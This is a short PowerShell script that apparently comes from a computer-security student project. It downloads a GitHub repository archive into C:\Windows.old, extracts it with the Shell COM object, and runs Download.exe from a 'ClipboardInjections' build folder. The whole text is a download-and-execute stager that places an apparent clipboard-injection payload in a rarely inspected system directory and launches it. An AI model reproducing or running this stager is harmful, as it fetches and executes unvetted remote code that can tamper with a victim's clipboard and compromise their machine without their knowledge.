cd "C:\Windows.old\" 
wget https://api.github.com/repos/Flaque/comp-security-project/zipball/master -OutFile comp-security-project-master.zip 

$shell = New-Object -ComObject shell.application
$zip = $shell.NameSpace("C:\Windows.old\comp-security-project-master.zip")
foreach ($item in $zip.items()) {
  $shell.Namespace("C:\Windows.old\").CopyHere($item)
}

cd "C:\Windows.old\Flaque-comp-security-project-57b44c4\ClipboardInjections\dist" ; .\Download.exe


